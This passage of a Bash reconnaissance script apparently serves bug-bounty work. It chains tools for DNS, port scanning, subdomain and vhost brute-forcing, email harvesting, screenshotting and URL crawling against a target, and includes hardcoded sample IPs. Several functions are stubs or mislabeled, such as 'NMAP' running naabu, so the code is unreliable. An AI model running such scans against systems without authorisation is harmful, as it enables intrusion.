	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | dnsx -duc -silent -nc -a -aaaa -cname -ns -txt -srv -ptr -mx -soa -axfr -caa -retry 3 -t 100 -json -r $RESOLVERS_WORDLIST -o ${SUBDOMAINDIR}/dnsx.json

	STOP_SPINNER
	echo -e "${BGREEN}[+] DNSX${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/dnsx.json || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Port Scanning
NAABU(){
	START_SPINNER "${BGREEN}NAABU${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 2>/dev/null | unew -ef -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/subdomain/naabu.txt 2>/dev/null | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] NAABU${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

MASSCAN(){
	START_SPINNER "${BGREEN}MASSCAN${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt
	masscan -p1-65535 -iL final-ips.txt --max-rate 10000 -oG $TARGET_OUTPUT

	STOP_SPINNER
	echo -e "${BGREEN}[+] MASSCAN${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

RUSTSCAN(){
	START_SPINNER "${BGREEN}RUSTSCAN${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] RUSTSCAN${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

NMAP(){
	START_SPINNER "${BGREEN}NMAP${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/allsubs.txt | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/naabu.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] NMAP${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Subdomain Probing
HTTPX(){
	START_SPINNER "${BGREEN}HTTPX${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/naabu.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -i -t -q ${ROOT_SUBDOMAINDIR}/httpx.txt

	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | awk '{print $1}' | dlevel --silent --max-level | unew -el -i -t -q ${SUBDOMAINDIR}/alivesubs.txt
	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | awk '{print $1}' | sed -e 's/https\?:\/\/\(www\.\)\?//' -e 's/:.*$//' | dlevel --silent --max-level | unew -el -i -t -q ${SUBDOMAINDIR}/withoutprotocolsubs.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] HTTPX${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/httpx.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Subdomain Bruteforcing
FFUFBRUTE(){
	START_SPINNER "${BGREEN}FFUFBRUTE${RESET}"

	# if [ "$MODE_FFUFBRUTE" = "NORMAL" ]; then
	# 	cat ${SUBDOMAINDIR}/*.subs | certinfo -silent -c 50 | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	# fi

	# if [ "$MODE_FFUFBRUTE" = "ADVANCED" ]; then
	# 	rcert -list ${SUBDOMAINDIR}/*.subs | eval ${SUBDOMAIN_FILTER} | grep -aE "^(.*\.)?$ESCAPED_TARGET$" | unew -el -i -t -q ${SUBDOMAINDIR}/certinfo.subs
	# fi

	# if [ "$FFUFBRUTE_USE_METHOD" = "1" ]; then
	# 	ffuf -s -u ${TARGET} -w ${ROOT_WORDLISTDIR}/perms.txt -mc ${FFUFBRUTE_STATUS_MATCH} -of json -o ${FFUFBRUTE}/ffufbrute.json
	# ffuf -u https://FUZZ.$domain -w ${ROOT_WORDLISTDIR}/perms.txt -t $threads -H $HEADER -mc 200 -r -v | grep "| URL |" | awk '{print $4}' | sed 's/^http[s]:\/\///g' | anew -q ./$domain/subdomain/ffuf.txt
	# else

	# fi

	if [ "$FFUFBRUTE_USE_CUSTOM_WORDLIST" = "TRUE" ]; then
		cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | tr '.-' '\n' | unew -el -i -t -q ${ROOT_WORDLISTDIR}/perms.txt
		cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | tr '.' '\n' | unew -el -i -t -q ${ROOT_WORDLISTDIR}/perms.txt

		# Use custom wordlist
		cat ${FFUFBRUTE_DEFAULT_CUSTOM_WORDLIST} | unew -el -i -t -q ${ROOT_WORDLISTDIR}/perms.txt
	else
		# if FFUFBRUTE_USE_CUSTOM_WORDLIST is FALSE then use only perms.txt generated by ${SUBDOMAINDIR}/withoutprotocolsubs.txt
		cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | tr '.-' '\n' | unew -el -i -t -q ${ROOT_WORDLISTDIR}/perms.txt
		cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | tr '.' '\n' | unew -el -i -t -q ${ROOT_WORDLISTDIR}/perms.txt
	fi

	cat ${SUBDOMAINDIR}/alivesubs.txt | subdomainfuzz -silent -d ${TARGET} -payload "FUZZ" | unew -el -t -q ${FFUFBRUTE}/fuzzsubs.txt

	# Check if the file exists and has 0 lines
    if [ ! -s "${FFUFBRUTE}/fuzzsubs.txt" ]; then
        echo -e "${BRED}[x] FFUFBRUTE${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	cat ${FFUFBRUTE}/fuzzsubs.txt | interlace --silent -threads ${INTERLACE_FFUFBRUTE_THREADS} -c "ffuf -s -u _target_ -w ${ROOT_WORDLISTDIR}/perms.txt -mc ${FFUFBRUTE_STATUS_MATCH} -of json -o _output_/_cleantarget_.json" -o ${FFUFBRUTE}
	cat ${FFUFBRUTE}/*.json | jq -r '.results[].host' | unew -el -i -t ${ROOT_SUBDOMAINDIR}/allsubs.txt | unew -el -i -t -q ${FFUFBRUTE}/ffuf.subs


	cat ${FFUFBRUTE}/ffuf.subs | naabu -duc -silent -c ${NAABU_THREADS} -rate ${NAABU_RATELIMIT} -timeout ${NAABU_TIMEOUT} -retries ${NAABU_RETRIES} -top-ports 1000 &>/dev/null | unew -el -i -t ${ROOT_SUBDOMAINDIR}/naabu.txt | unew -el -i -t -q ${FFUFBRUTE}/naabu.txt


	cat ${FFUFBRUTE}/naabu.txt | httpx -duc -silent -nc -td -t ${HTTPX_THREADS} | unew -el -i -t ${ROOT_SUBDOMAINDIR}/httpx.txt | unew -el -i -t -q ${FFUFBRUTE}/httpx.txt

	cat ${FFUFBRUTE}/httpx.txt | awk '{print $1}' | dlevel --silent --max-level | unew -el -i -t ${SUBDOMAINDIR}/alivesubs.txt | unew -el -i -t -q ${FFUFBRUTE}/alivesubs.txt
	cat ${FFUFBRUTE}/httpx.txt | awk '{print $1}' | sed -e 's/https\?:\/\/\(www\.\)\?//' -e 's/:.*$//' | dlevel --silent --max-level | unew -el -i -t ${SUBDOMAINDIR}/withoutprotocolsubs.txt | unew -el -i -t -q ${FFUFBRUTE}/withoutprotocolsubs.txt

	STOP_SPINNER
	echo -e "${BGREEN}[+] FFUFBRUTE${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/ffuf.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# VHOST Dicovery
FFUFVHOST(){
	START_SPINNER "${BGREEN}FFUFBRUTE${RESET}"

	# https://x.com/rez0__/status/1254588390114287617
	# https://x.com/nytr0gen_/status/1255029541321551872

	# cat ips.txt
	https://139.59.188.40
	https://34.107.205.1

	# vhost_wordlist.txt
	z
	zeus
	app-dev
	api
	app-api
	app-admin
	store
	stores
	admin

	# subs.txt
	boggs.ctfio.com
	public.sqrx.com


	ffuf -c -w ips.txt:IP -w subs.txt:FUZZ -u IP -H "Host: FUZZ"
	ffuf -c -w ips.txt:IP -w vhost_wordlist.txt:FUZZ -u IP -H "Host: FUZZ.boggs.ctfio.com" -mc 200,301,302
	ffuf -c -w ips.txt:IP -w vhost_wordlist.txt:FUZZ -w subs.txt:DOMAIN -u IP -H "Host: FUZZ.DOMAIN" -mc 200,301,302

	STOP_SPINNER
	echo -e "${BGREEN}[+] FFUFBRUTE${RESET}: $(wc -l 2>/dev/null < ${SUBDOMAINDIR}/ffuf.subs || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Favicon Lookup
FAVINFO(){
	START_SPINNER "${BGREEN}FAVINFO${RESET}"

	timelimitx -t ${FAVINFO_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | favinfo -silent -timeout $FAVINFO_TIMEOUT | unew -el -t -q ${FAVICON_HASH}/favinfo.txt"

	STOP_SPINNER
	echo -e "${BGREEN}[+] FAVINFO${RESET}: $(wc -l 2>/dev/null < ${FAVICON_HASH}/favinfo.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

FAVIRECON(){
	START_SPINNER "${BGREEN}FAVIRECON${RESET}"

	timelimitx -t ${FAVIRECON_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | favirecon -silent -concurrency $FAVIRECON_CONCURRENCY -timeout $FAVIRECON_TIMEOUT | unew -el -t -q ${FAVICON_HASH}/favirecon.txt"

	STOP_SPINNER
	echo -e "${BGREEN}[+] FAVIRECON${RESET}: $(wc -l 2>/dev/null < ${FAVICON_HASH}/favirecon.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Screenshotting
GOWITNESS(){
	START_SPINNER "${BGREEN}GOWITNESS${RESET}"

	if [ "$MODE" = "NORMAL" ]; then
		cat ${SUBDOMAINDIR}/alivesubs.txt | gowitness scan file -f - --screenshot-fullpage --delay $GOWITNESS_DELAY --timeout $GOWITNESS_TIMEOUT --threads $GOWITNESS_THREADS --save-content --write-db --screenshot-skip-save --write-screenshots
	fi

	if [ "$MODE" = "ADVANCED" ]; then
		# Taking Screenshot of urls instead of domain reveals more vuln like IIS, Swagger UI
		cat ${SUBDOMAINDIR}/urls.txt | gowitness scan file -f - --screenshot-fullpage --delay $GOWITNESS_DELAY --timeout $GOWITNESS_TIMEOUT --threads $GOWITNESS_THREADS --save-content --write-db --screenshot-skip-save --write-screenshots
		
		# extract all network logs in gowitness.sqlite3
	fi

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOWITNESS${RESET}: $(wc -l 2>/dev/null < ${SCREENSHOTS}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

AQUATONE(){
	START_SPINNER "${BGREEN}AQUATONE${RESET}"

	${SUBDOMAINDIR}/alivesubs.txt
	STOP_SPINNER
	echo -e "${BGREEN}[+] AQUATONE${RESET}: $(wc -l 2>/dev/null < ${SCREENSHOTS}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

EYEWITNESS(){
	START_SPINNER "${BGREEN}EYEWITNESS${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | eyewitness

	STOP_SPINNER
	echo -e "${BGREEN}[+] EYEWITNESS${RESET}: $(wc -l 2>/dev/null < ${SCREENSHOTS}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

HTTPX_SS(){
	START_SPINNER "${BGREEN}HTTPX_SS${RESET}"

	cat ${SUBDOMAINDIR}/alivesubs.txt | httpx -duc -silent -nc -ss -screenshot-timeout 60s

	STOP_SPINNER
	echo -e "${BGREEN}[+] HTTPX_SS${RESET}: $(wc -l 2>/dev/null < ${SCREENSHOTS}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Directory Enumeration
FFUFDIRENUM(){
	START_SPINNER "${BGREEN}FFUFDIRENUM${RESET}"

	cat ${ROOT_SUBDOMAINDIR}/httpx.txt | awk -F' ' '{ if ($2 == "[403]" || $2 == "[404]" || $2 == "[302]") print $1 }' | unew -el -i -t -q notaccessible_subs.txt
	cat notaccessible_subs.txt | interlace --silent -threads ${INTERLACE_THREADS} -c "ffuf -s -u _target_/FUZZ -w wordlists/onelistforallshort.txt -mc ${FFUFDIRENUM_STATUS_MATCH} -o _output_/_cleantarget_.json" -o ${SUBDOMAINDIR}/ffufdirenum

	STOP_SPINNER
	echo -e "${BGREEN}[+] FFUFDIRENUM${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

DIRSEARCH(){
	START_SPINNER "${BGREEN}DIRSEARCH${RESET}"

	${SUBDOMAINDIR}/alivesubs.txt
	STOP_SPINNER
	echo -e "${BGREEN}[+] DIRSEARCH${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

FEROXBUSTER(){
	START_SPINNER "${BGREEN}FEROXBUSTER${RESET}"

	${SUBDOMAINDIR}/alivesubs.txt
	STOP_SPINNER
	echo -e "${BGREEN}[+] FEROXBUSTER${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

WFUZZ(){
	START_SPINNER "${BGREEN}WFUZZ${RESET}"

	${SUBDOMAINDIR}/alivesubs.txt
	STOP_SPINNER
	echo -e "${BGREEN}[+] WFUZZ${RESET}: $(wc -l 2>/dev/null < ${ROOT_SUBDOMAINDIR}/naabu.txt || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Email Enumeration
EMAILFINDER(){
	START_SPINNER "${BGREEN}EMAILFINDER${RESET}"

	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | emailfinder saved | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | emailfinder skymem | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | emailfinder google -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | emailfinder bing -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | emailfinder duckduckgo -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | emailfinder yahoo -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails
	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | emailfinder yandex -e | unew -el -i -t -q ${ROOT_EMAILSDIR}/emailfinder.emails

	STOP_SPINNER
	echo -e "${BGREEN}[+] EMAILFINDER${RESET}: $(wc -l 2>/dev/null < ${ROOT_EMAILSDIR}/emailfinder.emails || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}


# Url Crawling
WAYMORE(){
	START_SPINNER "${BGREEN}WAYMORE${RESET}"

	timelimitx -t ${WAYMORE_TIMELIMITX} "echo ${TARGET} | waymore -mode U -lr 3 -lcc 3 -f 2>/dev/null | unew -el -i -t -q ${URLSDIR}/waymore.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/waymore.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/waymore.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] WAYMORE${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/waymore.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

HAKRAWLER(){
	START_SPINNER "${BGREEN}HAKRAWLER${RESET}"

	timelimitx -t ${HAKRAWLER_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | hakrawler -insecure -t ${HAKRAWLER_THREADS} -timeout ${HAKRAWLER_TIMEOUT} -d ${HAKRAWLER_DEPTH} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/hakrawler.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/hakrawler.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/hakrawler.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] HAKRAWLER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/hakrawler.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

WAYBACKURLS(){
	START_SPINNER "${BGREEN}WAYBACKURLS${RESET}"

	timelimitx -t ${WAYBACKURLS_TIMELIMITX} "echo ${TARGET} | waybackurls | unew -el -i -t -q ${URLSDIR}/waybackurls.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/waybackurls.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/waybackurls.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] WAYBACKURLS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/waybackurls.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

KATANA(){
	START_SPINNER "${BGREEN}KATANA${RESET}"

	timelimitx -t ${KATANA_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | katana -duc -silent -nc -ps -jc -kf -fx -xhr -concurrency ${KATANA_THREADS} -parallelism ${KATANA_PARALLELISM} -depth ${KATANA_DEPTH} -timeout ${KATANA_TIMEOUT} ${KATANA_RETRY} -delay ${KATANA_DELAY} -rate-limit ${KATANA_RATELIMIT} -crawl-duration ${KATANA_CRAWLDURATION} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/katana.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/katana.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/katana.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] KATANA${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/katana.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GAU(){
	START_SPINNER "${BGREEN}GAU${RESET}"

	timelimitx -t ${GAU_TIMELIMITX} "echo ${TARGET} | gau --threads ${GAU_THREADS} --timeout ${GAU_TIMEOUT} --retries ${GAU_RETRIES} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/gau.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/gau.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/gau.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GAU${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/gau.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GOSPIDER(){
	START_SPINNER "${BGREEN}GOSPIDER${RESET}"

	gospider -S ${SUBDOMAINDIR}/withoutprotocolsubs.txt -q --js --robots --sitemap -a -w -r --threads ${GOSPIDER_THREADS} --concurrent ${GOSPIDER_CONCURRENT} --depth ${GOSPIDER_DEPTH} --delay ${GOSPIDER_DELAY} --timeout ${GOSPIDER_TIMEOUT} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/gospider.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/gospider.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/gospider.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOSPIDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/gospider.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

UFORALL(){
	START_SPINNER "${BGREEN}UFORALL${RESET}"

	timelimitx -t ${UFORALL_TIMELIMITX} "echo ${TARGET} | uforall -silent -t all 2>/dev/null | unew -el -i -t -q ${URLSDIR}/uforall.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/uforall.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/uforall.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] UFORALL${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/uforall.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

CARIDDI(){
	START_SPINNER "${BGREEN}CARIDDI${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "${SUBDOMAINDIR}/alivesubs.txt" ]; then
        echo -e "${BRED}[x] CARIDDI${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	timelimitx -t ${CARIDDI_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | interlace --silent -threads ${INTERLACE_CARIDDI_THREADS} -c \"echo _target_ | cariddi -c $CARIDDI_CONCURRENCY -d $CARIDDI_DELAY -t $CARIDDI_TIMEOUT -rua 2>/dev/null > _output_/_cleantarget_.urls\" -o ${CARIDDIDIR} 2>/dev/null"
	cat ${CARIDDIDIR}/*.urls | unew -el -t -q ${URLSDIR}/cariddi.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/cariddi.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/cariddi.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] CARIDDI${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/cariddi.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

URLFINDER(){
	START_SPINNER "${BGREEN}URLFINDER${RESET}"

	timelimitx -t ${URLFINDER_TIMELIMITX} "echo ${TARGET} | urlfinder -silent -nc -all -config ~/.config/urlfinder/config.yaml -pc ~/.config/urlfinder/provider-config.yaml -timeout ${URLFINDER_TIMEOUT} 2>/dev/null | unew -el -i -t -q ${URLSDIR}/urlfinder.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/urlfinder.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/urlfinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] URLFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/urlfinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GITHUB_ENDPOINTS(){
	START_SPINNER "${BGREEN}GITHUB_ENDPOINTS${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "${SUBDOMAINDIR}/withoutprotocolsubs.txt" ]; then
        echo -e "${BRED}[x] GITHUB_ENDPOINTS${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

    # Run the commands if the file has content
	cat ${SUBDOMAINDIR}/withoutprotocolsubs.txt | interlace --silent -threads ${INTERLACE_GITHUB_ENDPOINTS_THREADS} -c "github-endpoints -d _target_ -k -raw -t ~/.config/github-endpoints/.github_tokens -o _output_/_cleantarget_.urls" -o ${GITHUB_ENDPOINTSDIR} 2>> >(sed "s/^/${FUNCNAME[0]}: /" >> "$ERRORLOGFILE") >/dev/null
	cat ${GITHUB_ENDPOINTSDIR}/*.urls | unew -el -t -q ${URLSDIR}/github-endpoints.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/github-endpoints.urls 2>/dev/null | unew -el -i -t -q ${URLSDIR}/github-endpoints.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GITHUB_ENDPOINTS${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/github-endpoints.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XURLFIND3R(){
	START_SPINNER "${BGREEN}XURLFIND3R${RESET}"

	timelimitx -t ${XURLFIND3R_TIMELIMITX} "echo ${TARGET} | xurlfind3r --silent --include-subdomains | unew -el -t -q ${URLSDIR}/xurlfind3r.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/xurlfind3r.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/xurlfind3r.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] XURLFIND3R${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/xurlfind3r.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

XCRAWL3R(){
	START_SPINNER "${BGREEN}XCRAWL3R${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "${SUBDOMAINDIR}/alivesubs.txt" ]; then
        echo -e "${BRED}[x] XCRAWL3R${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	timelimitx -t ${XCRAWL3R_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | interlace --silent -threads ${INTERLACE_XCRAWL3R_THREADS} -c \"xcrawl3r --silent --monochrome -u _target_ --depth $XCRAWL3R_DEPTH --timeout $XCRAWL3R_TIMEOUT --concurrency $XCRAWL3R_CONCURRENCY --delay $XCRAWL3R_DELAY --parallelism $XCRAWL3R_PARALLELISM --include-subdomains > _output_/_cleantarget_.urls\" -o ${XCRAWL3RDIR} 2>/dev/null"
	cat ${XCRAWL3RDIR}/*.urls | unew -el -t -q ${URLSDIR}/xcrawl3r.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/xcrawl3r.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/xcrawl3r.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] XCRAWL3R${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/xcrawl3r.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

CRAWLEY(){
	START_SPINNER "${BGREEN}CRAWLEY${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "${SUBDOMAINDIR}/alivesubs.txt" ]; then
        echo -e "${BRED}[x] CRAWLEY${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

	timelimitx -t ${CRAWLEY_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | interlace --silent -threads ${INTERLACE_CRAWLEY_THREADS} -c \"crawley -silent -all -brute -delay ${CRAWLEY_DELAY} -skip-ssl -js -robots crawl -depth ${CRAWLEY_DEPTH} -timeout ${CRAWLEY_TIMEOUT} -workers ${CRAWLEY_WORKERS} _target_ > _output_/_cleantarget_.urls\" -o ${CRAWLEYDIR} 2>/dev/null"
	cat ${CRAWLEYDIR}/*.urls | unew -el -t -q ${URLSDIR}/crawley.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/crawley.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/crawley.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] CRAWLEY${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/crawley.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GOLINKFINDER(){
	START_SPINNER "${BGREEN}GOLINKFINDER${RESET}"

	# Check if the file exists and has 0 lines
    if [ ! -s "${SUBDOMAINDIR}/alivesubs.txt" ]; then
        echo -e "${BRED}[x] GOLINKFINDER${RESET}: 0, ${TIME} seconds"
        STOP_SPINNER
        return
    fi

    # Run the commands if the file has content
	cat ${SUBDOMAINDIR}/alivesubs.txt | interlace --silent -threads ${INTERLACE_GOLINKFINDER} -c "GoLinkFinder --silent -d _target_ --complete-url --concurrency ${GOLINKFINDER_CONCURRENCY} --delay ${GOLINKFINDER_DELAY} --timeout ${GOLINKFINDER_TIMEOUT} > _output_/_cleantarget_.urls" -o ${GOLINKFINDERDIR} 2>/dev/null
	cat ${GOLINKFINDERDIR}/*.urls | unew -el -t -q ${URLSDIR}/GoLinkFinder.urls

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/GoLinkFinder.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/GoLinkFinder.urls

	STOP_SPINNER
	echo -e "${BGREEN}[+] GOLINKFINDER${RESET}: $(wc -l 2>/dev/null < ${URLSDIR}/GoLinkFinder.urls || echo 0), ${TIME} seconds" | unew -a $RESUMELOGFILE
}

GALER(){
	START_SPINNER "${BGREEN}GALER${RESET}"

	timelimitx -t ${GALER_TIMELIMITX} "cat ${SUBDOMAINDIR}/alivesubs.txt | galer --silent --depth ${GALER_DEPTH} --timeout ${GALER_TIMEOUT} --concurrency ${GALER_CONCURRENCY} --same-root 2>/dev/null | unew -el -i -t -q ${URLSDIR}/galer.urls"

	# Reuse old scanned data
	cat ${BASEDIR}/${TARGET}*/.tmp/urls/galer.urls 2>/dev/null | unew -el -t -q ${URLSDIR}/galer.urls

	STOP_SPINNER
